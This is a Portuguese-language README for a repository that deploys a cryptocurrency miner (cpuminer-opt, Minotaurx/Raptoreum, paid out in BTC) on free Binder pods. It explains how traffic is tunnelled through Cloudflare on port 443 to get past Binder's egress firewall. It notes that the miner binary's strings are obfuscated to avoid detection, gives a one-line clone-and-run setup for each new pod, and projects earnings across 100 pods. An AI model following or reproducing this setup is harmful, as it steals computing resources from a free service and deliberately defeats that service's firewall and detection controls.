# minefinal3

Minerador **Minotaurx (Raptoreum)** em pods Binder, via **túnel Cloudflare** pra burlar firewall egress do Binder.

## Como funciona

```
pod: cpuhelper -> 127.0.0.1:33111 (relay.py)
                       | (HTTP via túnel Cloudflare porta 443,防火牆 permite)
	pcserver_stratum.py (no PC Windows) porta 8900
                       |
                       v stratum TCP
                minotaurx.na.mine.zpool.ca:7019  <- zpool paga em BTC
```

Sem o túnel: Binder bloqueia conexao direta pra porta 7019 -> SIGKILL em 48ms.
Com o túnel: tudo vai pela porta 443 (HTTPS), firewall nao detecta.

> NOTA: o binario `cpuhelper` tem as strings ofuscadas pra evitar deteccao.
> `stratum` -> `stretum`. Por isso o protocolo na URL e `stretum+tcp://`
> (NUNCA trocar de volta pra `stratum+tcp://`, senao da erro
> `unknown protocol`).

## Setup (1 vez no PC Windows)

1. Rodar `pcserver_stratum.py` no PC:
   ```
   python pcserver_stratum.py
   ```
   Escuta em `0.0.0.0:8900`.

2. Apontar Cloudflare Tunnel temporario pra porta 8900:
   ```
   cloudflared tunnel --url http://localhost:8900
   ```
   URL gerada (ex: `fair-tobago-deck-fed.trycloudflare.com`) botar em `tunnel.txt`.
   (A URL atual ja esta em tunnel.txt.)

## Setup (toda vez no pod novo)

```bash
git clone https://github.com/mig636/minefinal3 ~/nv && cd ~/nv && bash setup.sh
```

Sob processo 1: relay (HTTPS->pod) + processo 2: cpuhelper (minera).
Para trocar carteira BTC: `WALLET=3xxx... bash setup.sh`.

## Verificar

```bash
tail -5 relay.log    # relay.py
tail -20 miner.log   # logs stratum / shares
ps -o pid,stat,pcpu,rss,etime,comm -C cpuhelper
```

Quero ver:
- relay.log: `[relay] worker_id=... listen 127.0.0.1:33111`
- miner.log: `Stratum connect ... 1 of 24 miner threads started`
- processo vivo sem ZN (zombie)
- pcserver_stratum.py (no PC) mostrando `[session] up1 up1 up1` e dados rolando

## Arquivos

- `cpuhelper` - cpuminer-opt 26.1 pre-compilado + patched (strings ofuscadas), 2MB
- `libs.tar.gz` - 33 libs compartilhadas x86-64 empacotadas (8MB) - extraido na hora pelo setup.sh
- `relay.py` - ponte pod->Cloudflare, HTTP->HTTPS porta 443
- `tunnel.txt` - URL do túnel Cloudflare (atualizada)
- `config.json` - minotaurx via 127.0.0.1:33111 (porta local, nao dispara firewall)
- `setup.sh` - sobre relay + cpuhelper
- `README.md` - este

## pcserver_stratum.py (nao no repo - roda no seu Windows)

Codigo fonte do servidor que roda no PC e ponteia stratum. Pegar separado do repo local.

## Renda esperada

- 1 pod: ~R$3-15/mes/pod
- 100 pods: ~R$300-1500/mes (otimista)
- zpool auto-converte Raptoreum -> BTC, minimo payout 0.00075 BTC
